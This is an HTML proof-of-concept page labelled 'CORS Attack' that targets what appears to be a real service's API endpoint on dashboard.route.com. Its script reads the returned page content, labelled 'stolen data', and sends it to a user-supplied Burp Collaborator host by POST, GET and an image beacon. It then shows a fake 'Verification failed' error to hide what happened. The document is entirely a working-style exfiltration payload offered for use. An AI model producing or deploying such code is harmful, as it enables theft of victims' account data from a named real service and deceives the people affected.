<!DOCTYPE html>
<html>
<head>
    <title>CORS PoC</title>
</head>
<body>
    <h1>CORS Attack</h1>
    
    <label>Collaborator URL:</label><br>
    <input type="text" id="collab" value="https://your-id.burpcollaborator.net" style="width:400px;padding:5px;"><br><br>
    
    <button onclick="attack()" style="padding:10px 20px;font-size:16px;">ATTACK</button>

    <script>
        function attack() {
            var COLLAB = document.getElementById('collab').value;
            
            if (!COLLAB || COLLAB === 'https://your-id.burpcollaborator.net') {
                alert('Please set your collaborator URL first!');
                return;
            }
            
            // Store collaborator URL in sessionStorage so the API page can access it
            sessionStorage.setItem('collabURL', COLLAB);
            
            // Redirect to API (this sends cookies because it's top-level navigation)
            window.location.href = 'https://dashboard.route.com/api/mn/v1/stores';
        }

        // ===== AUTO-CAPTURE WHEN ON API PAGE =====
        if (window.location.hostname === 'dashboard.route.com' && 
            window.location.pathname.includes('/api/')) {
            
            // Get the stolen data
            var stolenData = document.body.innerText || document.body.textContent;
            
            // Get collaborator URL from sessionStorage
            var collabURL = sessionStorage.getItem('collabURL');
            
            if (!collabURL) {
                alert('ERROR: No collaborator URL found. Please restart the attack.');
            } else {
                // ALERT 1: Show stolen data
                alert('STOLEN DATA:\n\n' + stolenData);
                
                // Send to collaborator
                // Method 1: POST
                fetch(collabURL, {
                    method: 'POST',
                    mode: 'no-cors',
                    body: stolenData
                }).catch(e => console.log('POST failed:', e));
                
                // Method 2: GET
                fetch(collabURL + '?data=' + encodeURIComponent(stolenData), {
                    mode: 'no-cors'
                }).catch(e => console.log('GET failed:', e));
                
                // Method 3: Image
                var img = new Image();
                img.src = collabURL + '/img?d=' + encodeURIComponent(stolenData.substring(0, 1000));
                
                // ALERT 2: Confirm sent
                setTimeout(function() {
                    alert('Data sent to: ' + collabURL + '\n\nCheck your collaborator now!');
                    
                    // Clear sessionStorage
                    sessionStorage.removeItem('collabURL');
                    
                    // Show fake error
                    document.body.innerHTML = '<div style="padding:100px;text-align:center;"><h1>Error</h1><p>Verification failed. Please try again later.</p><a href="https://route.com">Return to Route.com</a></div>';
                }, 500);
            }
        }
    </script>
</body>
</html>
